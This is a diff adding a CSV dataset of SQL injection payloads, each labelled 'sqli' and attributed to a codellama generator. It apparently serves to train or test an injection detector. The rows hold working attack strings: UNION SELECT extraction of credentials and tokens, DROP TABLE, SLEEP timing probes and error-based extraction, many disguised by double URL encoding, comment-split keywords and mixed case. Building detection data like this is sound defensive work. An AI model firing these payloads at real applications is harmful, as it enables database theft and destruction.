@@ -1,0 +1,1601 @@
+text,label,attack_type,generator
+""");%0AdRoP%0aTaBlE%0aCuStOmErS/*x*/",1,sqli,codellama
+%2527%253B%2520SeLeCt%2520sLeEp%25285%2529%252523,1,sqli,codellama
+"""+A/**/N/**/D+0<1+--%0a",1,sqli,codellama
+%2522%2529%2520OR%25201%253D1%2520LIMIT%25201--%2520,1,sqli,codellama
+%2522%2529%2520Or%2520%2527%2527%253d%2527%2527%2520--%2520-,1,sqli,codellama
+')/**/aNd/**/1 BeTwEeN 0 AnD 9/**/%23,1,sqli,codellama
+%2522%252509AND%252509%2527%2527%253D%2527%2527%252509%2523,1,sqli,codellama
+%2560%252F%252A%252A%252FA/**/N/**/D%252F%252A%252A%252F1%253D2%252F%252A%252A%252F%252523,1,sqli,codellama
+""")+A/**/N/**/D+'a'='a'+#",1,sqli,codellama
+""")	O/**/R	'a'='a'	-- ",1,sqli,codellama
+']%09A/**/N/**/D%09'a'='a'%09/*x*/,1,sqli,codellama
+%2560%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520NULL%252CNULL%252CNULL%252F%252Ax%252A%252F,1,sqli,codellama
+%2527%25250d%25250aAND%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--,1,sqli,codellama
+%2522%25250aAND%25250a2%253E1%25250a%252523,1,sqli,codellama
+`; D/**/R/**/O/**/P TABLE admin/*x*/,1,sqli,codellama
+%2522%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529--%2520-,1,sqli,codellama
+%2527%2520UNION%2520SELECT%2520email%252Crole%2520FROM%2520customers%2523,1,sqli,codellama
+`/**/AnD/**/2>1/**//*X*/,1,sqli,codellama
+';+DROP+TABLE+staff/*x*/,1,sqli,codellama
+%2522%2509A%252F%252A%252A%252FN%252F%252A%252A%252FD%25091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%2509--%2520-,1,sqli,codellama
+']%09AnD%09'a'='a'%09--,1,sqli,codellama
+') O/**/R 1=1 LIMIT 1%23,1,sqli,codellama
+']%0d%0Aa/**/N/**/d%0D%0a''=''%0d%0A--,1,sqli,codellama
+'%0aA/**/N/**/D%0a0<1%0a--,1,sqli,codellama
+%2527%2529%2520A/**/N/**/D%2520extractvalue%25281%252Cconcat%25280x7e%252C%2528S/**/E/**/L/**/E/**/C/**/T%2520status%2520F/**/R/**/O/**/M%2520admin%2520LIMIT%25201%2529%2529%2529,1,sqli,codellama
+%2522%25250D%25250aAnD%25250d%25250A1%2520bEtWeEn%25200%2520aNd%25209%25250D%25250a--,1,sqli,codellama
+%2522%25250aUNION%25250aSELECT%25250alast_name%252Cusername%252Crole%252Cstatus%25250aFROM%25250asessions%252F%252Ax%252A%252F,1,sqli,codellama
+` a/**/N/**/d ''='' #,1,sqli,codellama
+%2560%252BoR%252b1%2520BeTwEeN%25200%2520AnD%25209%252b%252523,1,sqli,codellama
+`+oR+1=2+--%09-,1,sqli,codellama
+%2522%2529%2509AND%25092%253E1%2509--%252F%252A%252A%252F-,1,sqli,codellama
+`; DrOp tAbLe cReDeNtIaLs#,1,sqli,codellama
+"'] UnIoN SeLeCt uSeR,LaSt_nAmE FrOm uSeRs#",1,sqli,codellama
+`%0d%0aA/**/N/**/D%0d%0a1/**/BETWEEN/**/0/**/A/**/N/**/D/**/9%0d%0a/*x*/,1,sqli,codellama
+'/**/A/**/N/**/D/**/2>1/**/--/**/-,1,sqli,codellama
+%2522%2529%252509OR%252509%2527a%2527%253D%2527a%2527%252509--,1,sqli,codellama
+`;%09D/**/R/**/O/**/P%09TABLE%09tokens/*x*/,1,sqli,codellama
+%2527%255D%2520Or%25201%253D1%2520lImIt%25201%2523,1,sqli,codellama
+'; D/**/R/**/O/**/P TABLE admin--,1,sqli,codellama
+%2560%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520username%252Cpwd%252Cstatus%252Caccount%252Clast_name%252Cid%2520F/**/R/**/O/**/M%2520admin--,1,sqli,codellama
+""" aNd ''='' #",1,sqli,codellama
+""");%09SELECT%09SLEEP(5)%23",1,sqli,codellama
+"`+UNION+SELECT+username,pwd,account,status+FROM+accounts#",1,sqli,codellama
+""")%0aOr%0A2>1%0A#",1,sqli,codellama
+%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520,1,sqli,codellama
+'	oR	''=''	--,1,sqli,codellama
+%2527%25250aOR%25250a1%2520LIKE%25201%25250a--%2520-,1,sqli,codellama
+']%0aAND%0a(SELECT%0aCOUNT(*)%0aFROM%0acredentials)>0%23,1,sqli,codellama
+"""%0aA/**/N/**/D%0a'a'='a'%0a#",1,sqli,codellama
+"""	A/**/N/**/D	'a'='a'	--%09",1,sqli,codellama
+%2527%255D%25250aOr%25250A1%253D2%25250A--%2520-,1,sqli,codellama
+""")%0aO/**/R%0a'a'='a'%0a-- ",1,sqli,codellama
+%2527%255D%25250d%25250aOR%25250d%25250a1%253D1%25250d%25250a--%2520,1,sqli,codellama
+""") A/**/n/**/D 1=2 #",1,sqli,codellama
+"' A/**/N/**/D extractvalue(1,concat(0x7e,(S/**/E/**/L/**/E/**/C/**/T account F/**/R/**/O/**/M admin LIMIT 1)))",1,sqli,codellama
+`%09oR%091 LiKe 1%09--,1,sqli,codellama
+%2560%253B%25250aSELECT%25250aSLEEP%25285%2529--,1,sqli,codellama
+%2522%25250d%25250aAND%25250d%25250a1%2520LIKE%25201%25250d%25250a%252523,1,sqli,codellama
+%2527%252F%252A%252A%252FO%252F%252A%252A%252FR%252F%252A%252A%252F1%2520LIKE%25201%252F%252A%252A%252F--%2520,1,sqli,codellama
+%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%2527%2527%253D%2527%2527%252F%252A%252A%252F--,1,sqli,codellama
+']/**/aNd/**/2>1/**//*x*/,1,sqli,codellama
+"""	OR	2>1	--/**/",1,sqli,codellama
+"""%09O/**/R%092>1%09--",1,sqli,codellama
+""") UnIoN SeLeCt uId,rOlE FrOm sEsSiOnS-- -",1,sqli,codellama
+'/**/AnD/**/1=2/**/--,1,sqli,codellama
+""")%0aO/**/R%0a1=1%0aLIMIT%0a1/*x*/",1,sqli,codellama
+%2522%25250d%25250aA%252F%252A%252A%252FN%252F%252A%252A%252FD%25250d%25250a1%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%25250d%25250a%252523,1,sqli,codellama
+') Or 1=1 lImIt 1--,1,sqli,codellama
+`%0aA/**/N/**/D%0a1+BETWEEN+0+A/**/N/**/D+9%0a--+,1,sqli,codellama
+""")/**/A/**/N/**/D/**/1 LIKE 1/**/--",1,sqli,codellama
+""") O/**/R ''='' -- ",1,sqli,codellama
+')%0aO/**/R%0a1%09LIKE%091%0a#,1,sqli,codellama
+')	A/**/n/**/D	1 LiKe 1	#,1,sqli,codellama
+"""/**/A/**/N/**/D/**/2>1/**/%23",1,sqli,codellama
+%2522%2529%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520email%2520F/**/R/**/O/**/M%2520accounts%252523,1,sqli,codellama
+""")/**/O/**/R/**/1%0aLIKE%0a1/**/--",1,sqli,codellama
+`+oR+0<1+--+,1,sqli,codellama
+"""/**/AnD/**/1=1/**/--",1,sqli,codellama
+%2527%2529%25250d%25250aOR%25250d%25250a1%2520BETWEEN%25200%2520AND%25209%25250d%25250a--%2520,1,sqli,codellama
+""") A/**/N/**/D 1 LIKE 1 -- ",1,sqli,codellama
+']+Or+0<1+/*x*/,1,sqli,codellama
+' O/**/R 1=2 /*x*/,1,sqli,codellama
+""")%09O/**/R%091%0aBETWEEN%0a0%0aA/**/N/**/D%0a9%09--",1,sqli,codellama
+%2527%2529%25250aAnD%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250a--,1,sqli,codellama
+%2560%2509OR%25091%253D2%2509--,1,sqli,codellama
+'%09aNd%092>1%09%23,1,sqli,codellama
+%2527%255D%252F%252A%252A%252FOR%252F%252A%252A%252F1%2520LIKE%25201%252F%252A%252A%252F--%2520,1,sqli,codellama
+')%09AnD%09(sElEcT%09CoUnT(*)%09fRoM%09CrEdEnTiAlS)>0--,1,sqli,codellama
+%2527%255D%2509O/**/R%2509%2527%2527%253D%2527%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
+'%09AND%091=1%09--,1,sqli,codellama
+%2527%2529%252BO/**/R%252B2%253E1%252B%2523,1,sqli,codellama
+'%0D%0aOr%0D%0a''=''%0d%0A#,1,sqli,codellama
+""")%0aAnD%0a''=''%0a%23",1,sqli,codellama
+`/**/Or/**/''=''/**/-- ,1,sqli,codellama
+%2560%2520oR%25201%253D1%2520LiMiT%25201%252F%252Ax%252A%252F,1,sqli,codellama
+'%0d%0aA/**/N/**/D%0d%0a1=1%0d%0a--/**/,1,sqli,codellama
+%2522%2520O/**/R%25201%253D1%2520LIMIT%25201--,1,sqli,codellama
+' a/**/N/**/d 1 bEtWeEn 0 a/**/N/**/d 9 #,1,sqli,codellama
+%2522%25250D%25250aOr%25250D%25250a%2527%2527%253D%2527%2527%25250d%25250A--,1,sqli,codellama
+`%09A/**/N/**/D%091/**/LIKE/**/1%09/*x*/,1,sqli,codellama
+""" a/**/N/**/d 1 bEtWeEn 0 a/**/N/**/d 9 /*x*/",1,sqli,codellama
+']%0aAND%0a1=2%0a--,1,sqli,codellama
+""") U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL,NULL,NULL,NULL-- -",1,sqli,codellama
+""" O/**/R 'a'='a' -- -",1,sqli,codellama
+%2560%25250d%25250aOR%25250d%25250a0%253C1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+%2527%255D%253B%2520SELECT%2520SLEEP%25285%2529--%2520,1,sqli,codellama
+')	O/**/R	1=1	#,1,sqli,codellama
+'%0aO/**/R%0a1=1%0aLIMIT%0a1%23,1,sqli,codellama
+""")/**/OR/**/2>1/**/--%0a",1,sqli,codellama
+""" aNd 0<1 #",1,sqli,codellama
+%2522%2520OR%25201%253D1%2520LIMIT%25201--%2520,1,sqli,codellama
+%2522%2529%2520OR%25201%253D1%2520LIMIT%25201--%2520-,1,sqli,codellama
+') Or 1=1 -- -,1,sqli,codellama
+'; S/**/e/**/L/**/e/**/C/**/t s/**/L/**/e/**/E/**/p(5)/*x*/,1,sqli,codellama
+']%0d%0AoR%0d%0A1=2%0D%0a--%09-,1,sqli,codellama
+%2527%2529%25250d%25250aAND%25250d%25250a1%253D2%25250d%25250a--%2520,1,sqli,codellama
+""")+O/**/r+1 lIkE 1+%23",1,sqli,codellama
+"""+aNd+(SeLeCt+cOuNt(*)+FrOm+sEsSiOnS)>0#",1,sqli,codellama
+'%0AaNd%0A1=2%0A%23,1,sqli,codellama
+%2527%2529%2509Or%2509%2527A%2527%253D%2527A%2527%2509--%2520-,1,sqli,codellama
+')+O/**/r+0<1+-- -,1,sqli,codellama
+%2560%25250d%25250aA/**/N/**/D%25250d%25250a1%253D2%25250d%25250a%2523,1,sqli,codellama
+')%0aOr%0A1=1%0A#,1,sqli,codellama
+""") UnIoN SeLeCt aCcOuNt,uId,iD FrOm aDmIn-- ",1,sqli,codellama
+'/**/O/**/R/**/'a'='a'/**/--,1,sqli,codellama
+')	OR	1+LIKE+1	--+-,1,sqli,codellama
+"""+AND+(SELECT+COUNT(*)+FROM+staff)>0/*x*/",1,sqli,codellama
+%2560%252509oR%2525092%253E1%252509%252523,1,sqli,codellama
+']+A/**/N/**/D+1 LIKE 1+#,1,sqli,codellama
+""" U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL,NULL,NULL,NULL,NULL/*x*/",1,sqli,codellama
+""") A/**/n/**/D 1=1 #",1,sqli,codellama
+%2527%252509AND%252509%2527%2527%253D%2527%2527%252509%252F%252Ax%252A%252F,1,sqli,codellama
+%2527%255D%252509Or%252509%2527A%2527%253D%2527A%2527%252509--,1,sqli,codellama
+"""+oR+1 BeTwEeN 0 AnD 9+/*X*/",1,sqli,codellama
+"""%0aO/**/R%0a'a'='a'%0a%23",1,sqli,codellama
+%2527%2529%2520A/**/N/**/D%25201%253D1%2520--%2520-,1,sqli,codellama
+']%09AND%092>1%09/*x*/,1,sqli,codellama
+%2522%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520customers%2529%253E0%252523,1,sqli,codellama
+'/**/A/**/n/**/D/**/1 lIkE 1/**/#,1,sqli,codellama
+%2522%2529%2520OR%2520%2527%2527%253D%2527%2527%2520%252523,1,sqli,codellama
+%2522%253B%2520DROP%2520TABLE%2520admin--%2520,1,sqli,codellama
+')%09A/**/n/**/D%092>1%09#,1,sqli,codellama
+"']%0aAnD%0aExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt%0AsTaTuS%0aFrOm%0AcReDeNtIaLs%0AlImIt%0A1)))",1,sqli,codellama
+"'] U/**/n/**/I/**/o/**/N S/**/e/**/L/**/e/**/C/**/t iD,StAtUs,lAsT_NaMe,uSeR,NaMe f/**/R/**/o/**/M UsErS--",1,sqli,codellama
+%2527%2529%252509OR%2525091%253D2%252509%2523,1,sqli,codellama
+%2560%252509OR%2525091%253D2%252509--,1,sqli,codellama
+%2522%252F%252A%252A%252FAND%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520,1,sqli,codellama
+%2522%2529%252BAND%252B%2527%2527%253D%2527%2527%252B--%2520,1,sqli,codellama
+%2522%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D2%252F%252A%252A%252F--%2520,1,sqli,codellama
+%2522%25250aAND%25250a1%2520LIKE%25201%25250a%252523,1,sqli,codellama
+'%0aO/**/R%0a'a'='a'%0a#,1,sqli,codellama
+%2527%2529%252509Or%252509%2527A%2527%253D%2527A%2527%252509%252523,1,sqli,codellama
+%2522%2529%2520OR%25201%253D1%2520LIMIT%25201%252523,1,sqli,codellama
+""");+DROP+TABLE+tokens%23",1,sqli,codellama
+%2527%253B%2520SeLeCt%2520sLeEp%25285%2529--,1,sqli,codellama
+%2560%2509A/**/N/**/D%25091%253D2%2509--%2520,1,sqli,codellama
+%2522%2529%2509OR%2509%2527a%2527%253D%2527a%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
+"""%0d%0aA/**/N/**/D%0d%0a1 BETWEEN 0 A/**/N/**/D 9%0d%0a-- -",1,sqli,codellama
+`	oR	2>1	#,1,sqli,codellama
+` a/**/N/**/d (S/**/e/**/L/**/e/**/C/**/t cOuNt(*) F/**/r/**/O/**/m uSeRs)>0-- -,1,sqli,codellama
+%2527%255D%252BOR%252B0%253C1%252B--%25250a-,1,sqli,codellama
+%2527%255D%2520AND%25200%253C1%2520%252F%252Ax%252A%252F,1,sqli,codellama
+' a/**/N/**/d (S/**/e/**/L/**/e/**/C/**/t cOuNt(*) F/**/r/**/O/**/m tOkEnS)>0-- -,1,sqli,codellama
+%2527%255D%2520Or%2520%2528SeLeCt%2520uSeRnAmE%2520FrOm%2520oRdErS%2520WhErE%2520UsErNaMe%253D907%2529%253d818,1,sqli,codellama
+%2560%252BoR%252B1%253D1%252B--,1,sqli,codellama
+"']+UnIoN+SeLeCt+tOkEn,uId,iD+FrOm+mEmBeRs--+",1,sqli,codellama
+""")/**/A/**/N/**/D/**/1/**/BETWEEN/**/0/**/A/**/N/**/D/**/9/**/--/**/-",1,sqli,codellama
+'] AnD 1 BeTwEeN 0 AnD 9 /*X*/,1,sqli,codellama
+` A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M admin)>0#,1,sqli,codellama
+""")+AND+extractvalue(1,concat(0x7e,(SELECT+username+FROM+tokens+LIMIT+1)))",1,sqli,codellama
+')+Or+0<1+#,1,sqli,codellama
+%2560%253B%2520DROP%2520TABLE%2520admin--,1,sqli,codellama
+""")	O/**/R	''=''	%23",1,sqli,codellama
+%2527%252BOR%252B1%253D1%252BLIMIT%252B1%2523,1,sqli,codellama
+%2522%2529%25250d%25250AaNd%25250D%25250a2%253E1%25250d%25250A--,1,sqli,codellama
+""")+O/**/r+2>1+-- ",1,sqli,codellama
+%2527%2529%252509A%252F%252A%252A%252FN%252F%252A%252A%252FD%2525091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252509--%2520-,1,sqli,codellama
+""")%09Or%09'A'='A'%09#",1,sqli,codellama
+%2527%255D%252BOR%252B1%252BBETWEEN%252B0%252BAND%252B9%252B--,1,sqli,codellama
+"')+UNION+SELECT+status,email,username+FROM+accounts--+",1,sqli,codellama
+')	O/**/R	''=''	--,1,sqli,codellama
+')/**/oR/**/0<1/**/--,1,sqli,codellama
+"""); d/**/R/**/o/**/P TaBlE MeMbErS%23",1,sqli,codellama
+'; DrOp tAbLe tOkEnS%23,1,sqli,codellama
+""")+AnD+'a'='a'+/*X*/",1,sqli,codellama
+%2560%252F%252A%252A%252FO/**/R%252F%252A%252A%252F1%253D2%252F%252A%252A%252F--,1,sqli,codellama
+"""; D/**/r/**/O/**/p tAbLe mEmBeRs%23",1,sqli,codellama
+%2527%255D%252BA%252F%252A%252A%252FN%252F%252A%252A%252FD%252B%2527a%2527%253D%2527a%2527%252B%2523,1,sqli,codellama
+%2522%2529%2520OR%2520%2527a%2527%253D%2527a%2527%2520--,1,sqli,codellama
+""")%0d%0AoR%0d%0A1%0alIkE%0a1%0d%0A--%0a",1,sqli,codellama
+')%0aOR%0a1=2%0a--+-,1,sqli,codellama
+%2527%2529%2520UNION%2520SELECT%2520user%2520FROM%2520members%252523,1,sqli,codellama
+"'] UnIoN SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl-- -",1,sqli,codellama
+""" a/**/N/**/d (S/**/e/**/L/**/e/**/C/**/t cOuNt(*) F/**/r/**/O/**/m mEmBeRs)>0--",1,sqli,codellama
+')+Or+1=1+#,1,sqli,codellama
+%2527%2529%25250d%25250aO/**/R%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,codellama
+`;%09DROP%09TABLE%09users#,1,sqli,codellama
+"') U/**/n/**/I/**/o/**/N S/**/e/**/L/**/e/**/C/**/t fIrSt_nAmE,AcCoUnT,Id,pAsSwO/**/rD F/**/r/**/O/**/m aDmIn%23",1,sqli,codellama
+')%09Or%090<1%09%23,1,sqli,codellama
+%2522%252BOR%252B1%253D1%252BLIMIT%252B1--%252B-,1,sqli,codellama
+%2522%2529%252F%252A%252A%252FaNd%252F%252A%252A%252F1%253D1%252F%252A%252A%252F%252523,1,sqli,codellama
+%2527%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529%252F%252Ax%252A%252F,1,sqli,codellama
+')	O/**/R	2>1	/*x*/,1,sqli,codellama
+` A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M accounts)>0/*x*/,1,sqli,codellama
+%2522%2529%25250d%25250AaNd%25250D%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250d%25250A%252f%252Ax%252A%252f,1,sqli,codellama
+%2522%2529%253B%252BSELECT%252BSLEEP%25285%2529%252F%252Ax%252A%252F,1,sqli,codellama
+')%0aO/**/R%0a2>1%0a--,1,sqli,codellama
+%2522%2529%2520OR%25202%253E1%2520--%2520-,1,sqli,codellama
+')%0aOr%0A'A'='A'%0A-- ,1,sqli,codellama
+']%0aO/**/R%0a1=1%0aLIMIT%0a1--%0a-,1,sqli,codellama
+%2522%2529%2520U%252F%252A%252A%252FN%252F%252A%252A%252FI%252F%252A%252A%252FO%252F%252A%252A%252FN%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520id%252Crole%252Cpwd%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520accounts--%2520-,1,sqli,codellama
+') Or 1 lIkE 1 /*X*/,1,sqli,codellama
+' oR ''='' #,1,sqli,codellama
+%2527%255D%2520Or%25201%253D1%2520lImIt%25201%252F%252aX%252a%252F,1,sqli,codellama
+%2522%2529%2509O/**/R%25091%2520BETWEEN%25200%2520A/**/N/**/D%25209%2509--,1,sqli,codellama
+%2527%2529%2520UNION%2520SELECT%2520user%2520FROM%2520members%252F%252Ax%252A%252F,1,sqli,codellama
+'] O/**/R 'a'='a' %23,1,sqli,codellama
+`%09A/**/N/**/D%092>1%09-- ,1,sqli,codellama
+`; SeLeCt sLeEp(5)-- -,1,sqli,codellama
+%2522%2520O%252F%252A%252A%252FR%25201%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%2520%2523,1,sqli,codellama
+%2527%255D%252F%252A%252A%252FoR%252F%252A%252A%252F2%253E1%252F%252A%252A%252F--%2520,1,sqli,codellama
+"']+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL--+",1,sqli,codellama
+`/**/AnD/**/0<1/**//*X*/,1,sqli,codellama
+'];%0AdRoP%0aTaBlE%0aAcCoUnTs/*X*/,1,sqli,codellama
+""")+O/**/r+''=''+/*x*/",1,sqli,codellama
+"""/**/UNION/**/SELECT/**/first_name/**/FROM/**/sessions/*x*/",1,sqli,codellama
+"""+oR+1%09LiKe%091+--%09",1,sqli,codellama
+'%0aA/**/N/**/D%0a'a'='a'%0a--%0a,1,sqli,codellama
+']/**/aNd/**/1 BeTwEeN 0 AnD 9/**/%23,1,sqli,codellama
+']%09Or%09''=''%09--/**/,1,sqli,codellama
+%2527%2529%25250aAnD%25250a%2527%2527%253D%2527%2527%25250a--%2520,1,sqli,codellama
+"""/**/O/**/R/**/2>1/**/--/**/",1,sqli,codellama
+%2527%255D%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520admin%2529%253E0--,1,sqli,codellama
+%2522%2529%2509Or%25091%2520lIkE%25201%2509%2523,1,sqli,codellama
+%2527%255D%2520A/**/N/**/D%25201%253D2%2520--%2520-,1,sqli,codellama
+%2522%25250d%25250aAND%25250d%25250a1%2520BETWEEN%25200%2520AND%25209%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+""")%09AnD%092>1%09-- ",1,sqli,codellama
+""")	OR	'a'='a'	--%09-",1,sqli,codellama
+%2527%255D%2509AND%25091%2520LIKE%25201%2509%252F%252Ax%252A%252F,1,sqli,codellama
+%2527%252F%252A%252A%252FOr%252F%252A%252A%252F1%2520LiKe%25201%252F%252A%252A%252F%2523,1,sqli,codellama
+%2560%2509AND%25091%253D1%2509--%2520-,1,sqli,codellama
+%2527%252BOR%252B%2527%2527%253D%2527%2527%252B%252523,1,sqli,codellama
+'	oR	'a'='a'	%23,1,sqli,codellama
+`%09O/**/R%091=1%09LIMIT%091%23,1,sqli,codellama
+'] A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M members)>0#,1,sqli,codellama
+""") AnD 1=2 /*X*/",1,sqli,codellama
+')%0d%0AaNd%0D%0a1 BeTwEeN 0 AnD 9%0d%0A#,1,sqli,codellama
+"""+aNd+''=''+#",1,sqli,codellama
+"""/**/O/**/R/**/1=1/**/-- ",1,sqli,codellama
+""")%0d%0aOR%0d%0a1=2%0d%0a--%0a-",1,sqli,codellama
+%2522%25250d%25250aO/**/R%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,codellama
+`%09oR%092>1%09-- -,1,sqli,codellama
+"')/**/U/**/N/**/I/**/O/**/N/**/S/**/E/**/L/**/E/**/C/**/T/**/last_name,first_name,id,uid,passwo/**/rd/**/F/**/R/**/O/**/M/**/credentials/*x*/",1,sqli,codellama
+%2527%2529%25250aAND%25250a2%253E1%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520members%2529%253E0%252523,1,sqli,codellama
+%2522%2529%252509OR%2525091%2520LIKE%25201%252509--,1,sqli,codellama
+`+OR+1%09LIKE%091+#,1,sqli,codellama
+'%09A/**/N/**/D%09''=''%09--%09-,1,sqli,codellama
+']	Or	2>1	--,1,sqli,codellama
+']/**/aNd/**/1%0aBeTwEeN%0a0%0aAnD%0a9/**//*x*/,1,sqli,codellama
+']	O/**/R	1=2	/*x*/,1,sqli,codellama
+'+aNd+1=1+/*x*/,1,sqli,codellama
+'%09AND%091%0aBETWEEN%0a0%0aAND%0a9%09--%0a,1,sqli,codellama
+""" oR 1=1 LiMiT 1%23",1,sqli,codellama
+'];+S/**/E/**/L/**/E/**/C/**/T+S/**/L/**/E/**/E/**/P(5)#,1,sqli,codellama
+"""/**/AND/**/0<1/**/--%0a-",1,sqli,codellama
+')+A/**/n/**/D+1 LiKe 1+%23,1,sqli,codellama
+' oR 1=1 /*X*/,1,sqli,codellama
+'/**/OR/**/1%0aBETWEEN%0a0%0aAND%0a9/**/#,1,sqli,codellama
+`/**/OR/**/1=1/**/LIMIT/**/1#,1,sqli,codellama
+%2522%2520OR%25201%253D1%2520LIMIT%25201%252F%252Ax%252A%252F,1,sqli,codellama
+` aNd 0<1 /*x*/,1,sqli,codellama
+`%0D%0aA/**/n/**/D%0d%0A1 bEtWeEn 0 a/**/N/**/d 9%0D%0a%23,1,sqli,codellama
+"'%0aUNION%0aSELECT%0afirst_name,email,status,password,id,role%0aFROM%0amembers/*x*/",1,sqli,codellama
+%2522%2529%253B%2520dRoP%2520TaBlE%2520AdMiN%252F%252Ax%252A%252F,1,sqli,codellama
+""")	A/**/N/**/D	''=''	/*x*/",1,sqli,codellama
+""" A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M credentials)>0/*x*/",1,sqli,codellama
+"""; D/**/R/**/O/**/P TABLE admin-- -",1,sqli,codellama
+'%0AaNd%0A2>1%0A-- -,1,sqli,codellama
+'] A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M accounts)>0#,1,sqli,codellama
+%2527%255D%252BAND%252B%2527%2527%253D%2527%2527%252B--%2520,1,sqli,codellama
+""")%09O/**/R%092>1%09--",1,sqli,codellama
+%2522%25250d%25250aOR%25250d%25250a0%253C1%25250d%25250a%2523,1,sqli,codellama
+%2522%2529%2509AnD%2509%2527%2527%253D%2527%2527%2509--%2520,1,sqli,codellama
+""")%0d%0Ao/**/R%0d%0A1 lIkE 1%0d%0A%23",1,sqli,codellama
+%2527%2529%2509OR%25091%253D2%2509%2523,1,sqli,codellama
+%2522%2509AND%25092%253E1%2509--,1,sqli,codellama
+%2522%2529%2520OR%25201%2520LIKE%25201%2520--%2520-,1,sqli,codellama
+')%0d%0Ao/**/R%0d%0A1=2%0D%0a#,1,sqli,codellama
+%2527%2529%2509OR%2509%2527a%2527%253D%2527a%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
+%2522%2529%252BAND%252B1%253D2%252B%252523,1,sqli,codellama
+' A/**/N/**/D 2>1 %23,1,sqli,codellama
+%2527%253B%2520SELECT%2520SLEEP%25285%2529%2523,1,sqli,codellama
+%2527%2520oR%25201%253d1%2520LiMiT%25201%252f%252Ax%252A%252f,1,sqli,codellama
+"""/**/Or/**/1=1/**//*x*/",1,sqli,codellama
+"""	O/**/R	''=''	--",1,sqli,codellama
+""")%0aU/**/N/**/I/**/O/**/N%0aS/**/E/**/L/**/E/**/C/**/T%0aNULL--",1,sqli,codellama
+%2527%2529%2520UnIoN%2520SeLeCt%2520rOlE%252CToKeN%252CUsEr%252ClAsT_NaMe%252CnAmE%252CUsErNaMe%2520fRoM%2520SeSsIoNs%2523,1,sqli,codellama
+%2560%2520aNd%25201%253D2%2520%252F%252Ax%252A%252F,1,sqli,codellama
+%2522%2529%252509AND%252509%2527a%2527%253D%2527a%2527%252509--,1,sqli,codellama
+%2522%252F%252A%252A%252FOR%252F%252A%252A%252F1%25250aBETWEEN%25250a0%25250aAND%25250a9%252F%252A%252A%252F--,1,sqli,codellama
+']+AnD+2>1+--,1,sqli,codellama
+`/**/AnD/**/''=''/**/-- -,1,sqli,codellama
+"""/**/Or/**/1=2/**/%23",1,sqli,codellama
+`/**/AnD/**/1%0AbEtWeEn%0A0%0AaNd%0A9/**/--%0A,1,sqli,codellama
+%2522%2509OR%25091%253D2%2509--%2520-,1,sqli,codellama
+']+Or+1=1+-- ,1,sqli,codellama
+%2560%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252a%2529%2520FrOm%2520aCcOuNtS%2529%253E0%252523,1,sqli,codellama
+%2527%255D%25250aA/**/N/**/D%25250a%2527a%2527%253D%2527a%2527%25250a--,1,sqli,codellama
+`+oR+1=2+--,1,sqli,codellama
+%2527%252509A%252F%252A%252A%252FN%252F%252A%252A%252FD%2525091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252509--%2520-,1,sqli,codellama
+%2527%2520OR%25201%253D1%2520LIMIT%25201--%2520-,1,sqli,codellama
+%2527%255D%25250d%25250AoR%25250d%25250A2%253E1%25250D%25250a--%2520-,1,sqli,codellama
+%2522%2529%25250aO%252F%252A%252A%252FR%25250a2%253E1%25250a--,1,sqli,codellama
